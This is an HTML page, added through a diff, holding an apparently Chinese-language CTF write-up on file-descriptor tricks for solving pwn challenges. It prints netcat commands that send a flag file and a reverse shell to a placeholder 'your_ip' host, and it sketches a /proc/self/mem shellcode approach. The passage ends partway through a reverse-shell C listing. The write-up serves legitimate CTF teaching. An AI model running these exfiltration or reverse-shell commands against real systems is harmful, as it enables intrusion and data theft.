@@ -1,0 +1,497 @@
+<!doctype html>
+
+<html lang="en">
+
+<head>
+  <title>localhost</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="M4x" />
+  <meta name="generator" content="Hugo 0.41" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="https://0x01f.github.io/css/styles.css" />
+</head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="https://0x01f.github.io/">localhost</a>
+            </h1>
+
+      <ul id="social-media">
+        
+        <li><a href="https://twitter.com/M4x88985494"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+          
+        <li><a href="https://github.com/0x01f"><i class="fa fa-github fa-lg" aria-hidden="true"></i></a></li>
+            
+        <li><a href="mailto:I_am_M4x@protonmail.com"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+        
+      </ul>
+      
+      <p><em>Done with development, it&rsquo;s time to pwn.</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="" href="https://0x01f.github.io/post/">
+                <i class="fa-li fa  fa-lg"></i><span>ls -l ./post</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="https://0x01f.github.io/post/link/">
+                <i class="fa-li fa  fa-lg"></i><span>cat ./friends</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="https://0x01f.github.io/post/aboutme/">
+                <i class="fa-li fa  fa-lg"></i><span>whoami</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>Play with file descriptor(Ⅲ)</h1>
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2018-09-12T15:30:01&#43;08:00">Sep 12, 2018</time>
+        </li>
+        
+        
+
+        
+
+        <li>Reading time 7 min</li>
+    </ul>
+</aside>
+
+    
+
+    
+
+<p>接下来以一些 pwnable 题目分析一些 fd tricks，如果以后遇到新的操作会继续更新。
+同样感谢大佬们的无私分享。</p>
+
+<h2 id="level-0-pwnable-kr-fd">level 0: pwnable.kr - fd</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">fd<span style="color:#960050;background-color:#1e0010">@</span>ubuntu:<span style="color:#f92672">~</span><span style="color:#960050;background-color:#1e0010">$</span> cat fd.c
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">32</span>];
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[], <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> envp[]){
+	<span style="color:#66d9ef">if</span>(argc<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>){
+		printf(<span style="color:#e6db74">&#34;pass argv[1] a number</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+	}
+	<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> atoi( argv[<span style="color:#ae81ff">1</span>] ) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1234</span>;
+	<span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	len <span style="color:#f92672">=</span> read(fd, buf, <span style="color:#ae81ff">32</span>);
+	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>strcmp(<span style="color:#e6db74">&#34;LETMEWIN</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf)){
+		printf(<span style="color:#e6db74">&#34;good job :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		system(<span style="color:#e6db74">&#34;/bin/cat flag&#34;</span>);
+		exit(<span style="color:#ae81ff">0</span>);
+	}
+	printf(<span style="color:#e6db74">&#34;learn about Linux file IO</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+}</code></pre></div>
+<p>有了前两篇的基础，这个就很简单了，只需要控制 read 的 第一个参数是 0 即可，当 fd = 0时，read 将会从 0 号文件，此时即为从 stdin 读取输入，接下来输入 &ldquo;LETMEWIN\n&rdquo; 即可。</p>
+
+<h2 id="level-1-wdb2018-impossible">level 1: WDB2018_impossible</h2>
+
+<p><a href="https://github.com/0x01f/pwn_repo/tree/master/WDB2018_impossible">binary &amp; exp here</a></p>
+
+<p>我们只分析与 fd 有关的部分</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  memset(secret_random, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8uLL</span>);
+  fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#ae81ff">0</span>);
+  read(fd, secret_random, <span style="color:#ae81ff">8uLL</span>);
+  printf(<span style="color:#e6db74">&#34;Input your secret code:&#34;</span>, secret_random);
+  read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">8uLL</span>);
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>memcmp(secret_random, buf, <span style="color:#ae81ff">8uLL</span>) )
+  {
+    puts(<span style="color:#e6db74">&#34;Amazing! How can u know the secret code?&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;Ok,u are the boss, u can do anything u want&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;But u should be quiet about this, because this is illegal&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;So...Close ur mouth...&#34;</span>);
+    close(<span style="color:#ae81ff">0</span>);
+    qmemcpy(buf, bored_buf, <span style="color:#ae81ff">0x1000uLL</span>);
+  }</code></pre></div>
+<p>仔细看这段代码，open(&ldquo;/dev/urandom&rdquo;, 0); 后并没有对应的 close 操作。
+因此如果重复运行这段代码，fd 会一直增加，到达该用户所能承受的最大量后（可以使用 <code>ulimit -a</code> 查看），下一次 open(&ldquo;/dev/urandom&rdquo;, 0); 就会失败，导致 read(fd, secret_random, 8uLL); 读了空数据，我们只需要输入 <code>\0</code> 即可通过 memcmp 的验证；</p>
+
+<p>还有一点需要注意，这道题目随后关闭了 stdin (close(0))，因此即使我们能 get shell，我们的输入也不会被接受。但幸运的是题目只关闭了 stdin，stdout 和 stderr 还是可以用的，因此思路就有很多了，比如直接构造一段 <code>open(&quot;./flag&quot;, 0); read(0, addr, 0x100); puts(addr)</code> 的 ropchain 就可以得到 flag （因为 close(0)， open(&ldquo;./flag&rdquo;, 0) 返回的 fd 将为 0)。</p>
+
+<p>类似的题目还有 pwnable.kr - otp</p>
+
+<h2 id="level-2-whitehat2018-pwn3">level 2: Whitehat2018 - pwn3</h2>
+
+<p><a href="https://github.com/0x01f/pwn_repo/tree/master/WhiteHat2018_pwn03">binary &amp; exp here</a></p>
+
+<p>同样只分析与 fd 有关的部分，通过 ret2vsyscall 获得一次任意命令执行的机会后，剩下的目的就是如何获取 flag 了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">echo</span>()
+{
+  <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// ST0C_4
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [rsp+Ch] [rbp-E4h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">216</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-E0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+E8h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  v3 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  v0 <span style="color:#f92672">=</span> v1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>;
+  read(<span style="color:#ae81ff">0</span>, buf, v0);
+  printf(<span style="color:#e6db74">&#34;Echo machine: &#34;</span>, buf);
+  write(<span style="color:#ae81ff">1</span>, buf, v0);
+  close(<span style="color:#ae81ff">0</span>);
+  close(<span style="color:#ae81ff">1</span>);
+  strcpy(buf, deleteyourevilstring);
+}</code></pre></div>
+<p>这道题目的 stdin 和 stdout 都被关闭了，但因为我们有一次任意命令执行的机会，至少有以下三种方法获得 flag:</p>
+
+<ul>
+<li>利用 stderr， 执行 <code>sh ./flag</code> 。当 shell 检测到 flag 的内容不是合法的 shell 指令时，会通过 stderr 将 flag 内容打印到显示屏上</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">WhiteHat2018_pwn03 <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> sh ./flag 
+./flag: <span style="color:#ae81ff">1</span>: ./flag: flag<span style="color:#f92672">{</span>this_is_flag<span style="color:#f92672">}</span>: not found</code></pre></div>
+<ul>
+<li>利用 pipe，前两篇提到 pipe 也是一种文件，虽然 stdin 和 stdout 被关闭了，但我们任然可以通过执行命令建立 pipe，利用 pipe 将 flag 内容发送到公网 vps，在 vps 上监听即可</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">WhiteHat2018_pwn03 <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> cat ./flag| nc your_ip your_port
+......
+On vps:
+ubuntu@VM-61-71-ubuntu:~$ nc -lvp your_port
+Listening on <span style="color:#f92672">[</span><span style="color:#ae81ff">0</span>.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family <span style="color:#ae81ff">0</span>, port ????<span style="color:#f92672">)</span>
+Connection from <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span>.202.222.147<span style="color:#f92672">]</span> port ???? <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> accepted <span style="color:#f92672">(</span>family <span style="color:#ae81ff">2</span>, sport <span style="color:#ae81ff">47042</span><span style="color:#f92672">)</span>
+flag<span style="color:#f92672">{</span>this_is_flag<span style="color:#f92672">}</span></code></pre></div>
+<ul>
+<li>建立一个 reverse shell，reverse shell 的原理完全可以另开一篇 post 介绍，这里就不再解释原理，在最后放了两篇参考链接，介绍的很清楚，对 reverse shell 不太了解的可以先读一下这两篇文章。</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">WhiteHat2018_pwn03 <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> nc -e /bin/sh your_ip your_port
+......
+
+On vps:
+ubuntu@VM-61-71-ubuntu:~$ nc -lvp your_port
+Listening on <span style="color:#f92672">[</span><span style="color:#ae81ff">0</span>.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family <span style="color:#ae81ff">0</span>, port ????<span style="color:#f92672">)</span>
+Connection from <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span>.202.222.147<span style="color:#f92672">]</span> port ???? <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> accepted <span style="color:#f92672">(</span>family <span style="color:#ae81ff">2</span>, sport <span style="color:#ae81ff">47442</span><span style="color:#f92672">)</span>
+ls
+flag
+libc-2.27.i64
+libc-2.27.so
+onehit
+onehit.i64
+solve.py
+pwd
+/home/m4x/pwn_repo/WhiteHat2018_pwn03
+id
+uid<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="color:#f92672">(</span>m4x<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="color:#f92672">(</span>m4x<span style="color:#f92672">)</span> 组<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="color:#f92672">(</span>m4x<span style="color:#f92672">)</span>,7<span style="color:#f92672">(</span>lp<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>,113<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,117<span style="color:#f92672">(</span>scanner<span style="color:#f92672">)</span>,124<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>,127<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span></code></pre></div>
+<p>类似的题目有 0CTF2018 的 babystack</p>
+
+<h2 id="level-3-tokyowestern2018-load">level 3: TokyoWestern2018 - load</h2>
+
+<p><a href="https://github.com/0x01f/pwn_repo/tree/master/TokyoWesterns2018_load">bianry &amp; exp here</a></p>
+
+<p>这道题目用到了很多 fd 的知识</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
+{
+  <span style="color:#66d9ef">char</span> a1a[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-30h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> size; <span style="color:#75715e">// [rsp+20h] [rbp-10h]
+</span><span style="color:#75715e"></span>  __off_t offset; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  set_buffer();
+  _printf_chk(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Load file Service</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Input file name: &#34;</span>);
+  get_str(filename, <span style="color:#ae81ff">128</span>);
+  _printf_chk(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Input offset: &#34;</span>);
+  offset <span style="color:#f92672">=</span> get_int();
+  _printf_chk(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Input size: &#34;</span>);
+  size <span style="color:#f92672">=</span> get_int();
+  load_file(a1a, filename, offset, size);
+  close_all();
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">load_file</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a2, __off_t a3, <span style="color:#66d9ef">__int64</span> a4)
+{
+  <span style="color:#66d9ef">__int64</span> nbytes; <span style="color:#75715e">// [rsp+0h] [rbp-30h]
+</span><span style="color:#75715e"></span>  __off_t offset; <span style="color:#75715e">// [rsp+8h] [rbp-28h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> fd; <span style="color:#75715e">// [rsp+2Ch] [rbp-4h]
+</span><span style="color:#75715e"></span>
+  offset <span style="color:#f92672">=</span> a3;
+  nbytes <span style="color:#f92672">=</span> a4;
+  fd <span style="color:#f92672">=</span> open(a2, <span style="color:#ae81ff">0</span>);
+  <span style="color:#66d9ef">if</span> ( fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+  {
+    puts(<span style="color:#e6db74">&#34;You can&#39;t read this file...&#34;</span>);
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    lseek(fd, offset, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> ( read(fd, a1, nbytes) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+      puts(<span style="color:#e6db74">&#34;Load file complete!&#34;</span>);
+    close(fd);
+  }
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">close_all</span>()
+{
+  close(<span style="color:#ae81ff">0</span>);
+  close(<span style="color:#ae81ff">1</span>);
+  close(<span style="color:#ae81ff">2</span>);
+}</code></pre></div>
+<p>栈溢出的漏洞很好发现，但关键是我们只有打开远程文件，并从文件中读取内容的能力。根据一切皆文件的思想，如果打开 <code>/proc/self/fd/0</code> ，在 load_file() 中就相当于 read(3, a1, nbytes)，但注意此时的 3 是 stdin，也就是说可以通过打开 /proc/self/fd/0 ，并从 stdin 读入数据来控制缓冲区内容。</p>
+
+<p>那么我们要怎么利用呢？分析两种方法。</p>
+
+<h3 id="ropchain">ropchain</h3>
+
+<h4 id="pty-和-pts">pty 和 pts</h4>
+
+<p>先介绍一下什么是 pty 和 pts。我们已经知道 fd 指向被打开的文件，那么我们看一下 stdin，stdout 和 stderr 指向什么</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">others_reverse_shell <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> ./file_descriptor
+.......
+
+others_reverse_shell <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> pgrep file_descriptor
+<span style="color:#ae81ff">8942</span>
+others_reverse_shell <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> file /proc/8942/fd/0
+/proc/8942/fd/0: symbolic link to /dev/pts/2
+others_reverse_shell <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> file /proc/8942/fd/1
+/proc/8942/fd/1: symbolic link to /dev/pts/2
+others_reverse_shell <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> file /proc/8942/fd/2
+/proc/8942/fd/2: symbolic link to /dev/pts/2</code></pre></div>
+<p>都指向了 <code>/dev/pts/2</code> 这个文件，pts 是 tty 的一部分，后续会介绍。</p>
+
+<p>在第一篇已经说到了 tty 子系统是用来管理终端的，对每一个连接的终端，都会有一个 tty 设备与其对应，关系如下：</p>
+
+<pre><code>                      +----------------+
+                      |   TTY Driver   |
+                      |                |
+                      |   +-------+    |       +----------------+
+ +------------+       |   |       |&lt;----------&gt;| User process A |
+ | Terminal A |&lt;---------&gt;| ttyS0 |    |       +----------------+
+ +------------+       |   |       |&lt;----------&gt;| User process B |
+                      |   +-------+    |       +----------------+
+                      |                |
+                      |   +-------+    |       +----------------+
+ +------------+       |   |       |&lt;----------&gt;| User process C |
+ | Terminal B |&lt;---------&gt;| ttyS1 |    |       +----------------+
+ +------------+       |   |       |&lt;----------&gt;| User process D |
+                      |   +-------+    |       +----------------+
+                      |                |
+                      +----------------+
+</code></pre>
+
+<p>在 shell 里使用 <code>tty</code> 命令可以查看当前 shell 被关联到了哪个 tty</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">others_reverse_shell <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> tty
+/dev/pts/3
+others_reverse_shell <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> echo test &gt; /dev/pts/3
+test
+others_reverse_shell <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> lsof /dev/pts/3
+COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+zsh      <span style="color:#ae81ff">8944</span>  m4x    0u   CHR  <span style="color:#ae81ff">136</span>,3      0t0    <span style="color:#ae81ff">6</span> /dev/pts/3
+zsh      <span style="color:#ae81ff">8944</span>  m4x    1u   CHR  <span style="color:#ae81ff">136</span>,3      0t0    <span style="color:#ae81ff">6</span> /dev/pts/3
+zsh      <span style="color:#ae81ff">8944</span>  m4x    2u   CHR  <span style="color:#ae81ff">136</span>,3      0t0    <span style="color:#ae81ff">6</span> /dev/pts/3
+zsh      <span style="color:#ae81ff">8944</span>  m4x   10u   CHR  <span style="color:#ae81ff">136</span>,3      0t0    <span style="color:#ae81ff">6</span> /dev/pts/3
+lsof    <span style="color:#ae81ff">10598</span>  m4x    0u   CHR  <span style="color:#ae81ff">136</span>,3      0t0    <span style="color:#ae81ff">6</span> /dev/pts/3
+lsof    <span style="color:#ae81ff">10598</span>  m4x    1u   CHR  <span style="color:#ae81ff">136</span>,3      0t0    <span style="color:#ae81ff">6</span> /dev/pts/3
+lsof    <span style="color:#ae81ff">10598</span>  m4x    2u   CHR  <span style="color:#ae81ff">136</span>,3      0t0    <span style="color:#ae81ff">6</span> /dev/pts/3</code></pre></div>
+<p>可以看到当前 shell 使用的是 /dev/pts/3，因此直接往 /dev/pts/3 写数据跟标准输出是一样的；</p>
+
+<p>使用 lsof 可以看出当前 shell 和 lsof 进程的 stdin(0u)，stdout(1u)，stderr(2u) 都绑定到了这个 tty 上，此时它们的关系如下</p>
+
+<pre><code>   Input    +--------------------------+    R/W     +------+
+-----------&gt;|                          |&lt;----------&gt;| bash |
+            |        /dev/pts/3        |            +------+
+&lt;-----------|                          |&lt;----------&gt;| lsof |
+   Output   | Foreground process group |    R/W     +------+
+            +--------------------------+
+</code></pre>
+
+<p>然后说一下 pty，使用 <code>man 7 pty</code> 查看 pty 的用户手册</p>
+
+<pre><code>DESCRIPTION
+       A  pseudoterminal  (sometimes abbreviated &quot;pty&quot;) is a pair of virtual character
+       devices that provide a bidirectional communication channel.   One  end  of  the
+       channel is called the master; the other end is called the slave.  
+</code></pre>
+
+<p>pty 属于伪终端，“伪” 体现在 pty 是逻辑上的终端设备，但多用于模拟终端程序，比如使用 ssh，talnet 和 windows 下的 putty 等连接的终端时，此时并没有真正的设备连接到了主机，而是建立了一个<strong>伪终端</strong>来模拟各种行为。</p>
+
+<p>从 man 手册中也可以看出 pty 分为 master 和 slave 两部分，其中 slave 部分称为 pts，master 称为 ptmx，二者结合实现 pty。工作流程可以简单的解释为进程通过调用 API 请求 ptmx 建立了一个 pts，然后会得到连接到 ptmx 的 fd 和一个新建的 pts（可以使用 <code>man pts</code> 查看更多细节）。</p>
+
+<h4 id="构造-ropchain">构造 ropchain</h4>
+
+<p>说了半天，再回到这道题目，虽然这道题目关闭了 stdin, stdout 和 stderr，pty 还在，换句话说，如果我们能控制 /dev/pts/? 的 fd 为 1，那么 puts(flag) 时就会把输出传递给 /dev/pts/? ，也就是我们能在显示屏上看到 flag。</p>
+
+<p>总结一下思路：</p>
+
+<ol>
+<li>利用 open(&ldquo;/proc/self/fd/0&rdquo;, 0) 来构造 ropchain</li>
+<li>ropchain 通过 open 和 read 把 flag 读到一个固定地址，同时控制 open(&ldquo;/dev/pty/?&rdquo;, 2) 返回的 fd 为 1</li>
+<li>puts(flag) 时，系统调用为 write(1, flag, len(flag))，也就是 flag 的内容将会输出到显示屏上</li>
+</ol>
+
+<p><a href="https://github.com/0x01f/pwn_repo/blob/master/TokyoWesterns2018_load/ropchian.py">ropchian exploit here</a></p>
+
+<h3 id="reverse-shell">reverse shell</h3>
+
+<p>或者我们可以使用 reverse shell 来 get shell，这需要用到一些 procfs 的知识，不准备细讲，只需要知道可以通过往 /proc/self/mem 写数据更改 binary 内容即可（类似的题目有赛博地球杯的 <a href="https://github.com/0x01f/pwn_repo/tree/master/Cyber2017_fileManager">fileManager</a> 这道题目）。</p>
+
+<p>通过 vmmap 可以看出 0x400000 - 0x401000 段具有可以行权限，且地址是固定的，因此我们可以控制 open(&ldquo;/proc/self/mem&rdquo;, 2) 返回的 fd 为 1，然后通过 puts(shellcode) 既可以将 shellcode 写到这段地址上，再控制 rip 到 shellcode 就可以建立一个 reverse shell（reverse shell 的经典题目有 pwnable.tw 的 kidding 等）。</p>
+
+<p>总结一下思路：</p>
+
+<ol>
+<li>利用 open(&ldquo;/proc/self/fd/0&rdquo;, 0) 来构造 ropchain，ropchain 实现 open(&ldquo;/proc/self/mem&rdquo;, 2) 返回的 fd 为 1</li>
+<li>通过 puts(shellcode) 将 shellcode 写到具有可执行权限的代码段，可以用 lseek 控制 puts 写的位置</li>
+<li>控制 rip 为 shellcode 建立 reverse shell</li>
+<li>可以使用 /dev/stdin 代替 /proc/self/fd/0，效果一样，可以给 shellcode 留下更多空间</li>
+</ol>
+
+<p><a href="https://github.com/0x01f/pwn_repo/blob/master/TokyoWesterns2018_load/reverse_shell.py">revrese shell exploit here</a></p>
+
+<h3 id="reverse-shell-原理">reverse shell 原理</h3>
+
+<p>简单介绍一下 reverse shell 的原理，先给出经典的 reverse shell 的建立方式</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">others_reverse_shell [master<span style="color:#960050;background-color:#1e0010">●</span>] bat reverse_shell.c 
+<span style="color:#960050;background-color:#1e0010">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
+       <span style="color:#960050;background-color:#1e0010">│</span> File: reverse_shell.c
+<span style="color:#960050;background-color:#1e0010">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
+   <span style="color:#ae81ff">1</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#75715e">// reverse shell
+</span><span style="color:#75715e"></span>   <span style="color:#ae81ff">2</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>   <span style="color:#ae81ff">3</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>   <span style="color:#ae81ff">4</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>   <span style="color:#ae81ff">5</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+   <span style="color:#ae81ff">6</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#75715e">#define NULL 0
+</span><span style="color:#75715e"></span>   <span style="color:#ae81ff">7</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+   <span style="color:#ae81ff">8</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">int</span> socket(<span style="color:#66d9ef">int</span> domain, <span style="color:#66d9ef">int</span> type, <span style="color:#66d9ef">int</span> protocal);
+   <span style="color:#ae81ff">9</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">int</span> connect(<span style="color:#66d9ef">int</span> sockfd, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>addr, socklen_t addrlen);
+  <span style="color:#ae81ff">10</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">int</span> dup2(<span style="color:#66d9ef">int</span> oldfd, <span style="color:#66d9ef">int</span> newfd);
+  <span style="color:#ae81ff">11</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">int</span> execve(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> argv[], <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> envp[]);
+  <span style="color:#ae81ff">12</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">int</span> close(<span style="color:#66d9ef">int</span> fd);
+  <span style="color:#ae81ff">13</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">14</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">void</span> reverse_shell()
+  <span style="color:#ae81ff">15</span>   <span style="color:#960050;background-color:#1e0010">│</span> {
+  <span style="color:#ae81ff">16</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> address <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;your_ip&#34;</span>;
+  <span style="color:#ae81ff">17</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> your_port;
+  <span style="color:#ae81ff">18</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">19</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#75715e">// create a new socket but it has no address assigned yet
